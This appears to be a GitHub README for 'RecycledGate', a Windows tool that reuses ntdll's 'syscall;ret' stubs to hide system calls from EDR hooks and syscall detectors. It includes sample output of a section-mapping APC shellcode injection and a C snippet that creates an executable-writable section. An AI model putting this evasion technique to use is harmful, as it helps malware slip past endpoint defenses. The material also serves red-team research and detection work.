# RecycledGate

This is just another implementation of Hellsgate + Halosgate/Tartarusgate.    

However, this implementation makes sure that **all system calls still go through ntdll.dll** to avoid the usage of direct systemcalls.
To do so, I parse the ntdll for nonhooked syscall-stubs and re-use existing ```syscall;ret``` instructions - thus the name of this project.   

This probably bypasses some EDR trying to detect abnormal systemcalls.    
I have verified the sample program in this repository against [syscall-detect](https://github.com/jackullrich/syscall-detect) by [@winternl_t](https://twitter.com/winternl_t) which uses the [HookingNirvana](https://github.com/ionescu007/HookingNirvana/blob/master/Esoteric%20Hooks.pdf) technique to detect abnormal systemcalls.

```
.\Sample.exe HelloWorld.bin
[SYSCALL-DETECT] Console logging started...
[SYSCALL-DETECT] ntdll BaseAddress: 0x368508928
[SYSCALL-DETECT] win32u BaseAddress: 0x0
[*] Resolving Syscall: 916c6394
        Found syscall using Halos gate
        Found syscall; ret instruction
        Syscall nr: 74
        Gate: 00007FF9160100E2
[SNIP]
[*] Resolving Syscall: 8a4e6274
        Found syscall using Halos gate
        Found syscall; ret instruction
        Syscall nr: 188
        Gate: 00007FF916010F12
[*] Created section: 0x00000000000000B4
[*] Mapped section locally: 0x000001B244E50000
[*] Mapped section remote: 0x0000000000FE0000
[*] NtQueueApcThread successfull
[*] Resumed thread
```

The sample program can be found in the **sample** folder     

## Usage
Here is a snippet, which should be self-explanatory.
```c
Syscall sysNtCreateSection = { 0x00 };
NTSTATUS ntStatus;

dwSuccess = getSyscall(0x916c6394, &sysNtCreateSection);
if (dwSuccess == FAIL)
  goto exit;

PrepareSyscall(sysNtCreateSection.dwSyscallNr, sysNtCreateSection.pRecycledGate);
ntStatus = DoSyscall(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sizeBuffer, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
if (!NT_SUCCESS(ntStatus)) {
  printf("[-] Failed to create section\n");
  goto exit;
}

```
**Note**:
* No lines of code should exist between the call to **PrepareSyscall** and **DoSyscall**
* The hash algorithm used is djb2. All hashes must be encrypted with the key **0x41424344**. You can use the Hashgenerator in this repository

## Credits
* [Sektor7](https://sektor7.net) for inventing and documenting [Halosgate](https://blog.sektor7.net/#!res/2021/halosgate.md) on which this project is based
* [Sektor7](https://sektor7.net) for the amazing [windows evasion class](https://institute.sektor7.net/view/courses/rto-win-evasion/)
* [@Am0nsec](https://twitter.com/am0nsec?lang=en) and @RtlMateusz for the [original Hellsgate implementation](https://github.com/am0nsec/HellsGate)
* [@0xBoku](https://twitter.com/0xBoku) for inspiration and his [Halosgate implementation](https://github.com/boku7/AsmHalosGate/)
* [@trickster012](https://twitter.com/trickster012) for the implementation of [Tartarusgate](https://github.com/trickster0/TartarusGate)
* [@winternl_t](https://twitter.com/winternl_t) for the amazing [blogpost on detection of direct syscalls](https://winternl.com/detecting-manual-syscalls-from-user-mode/)
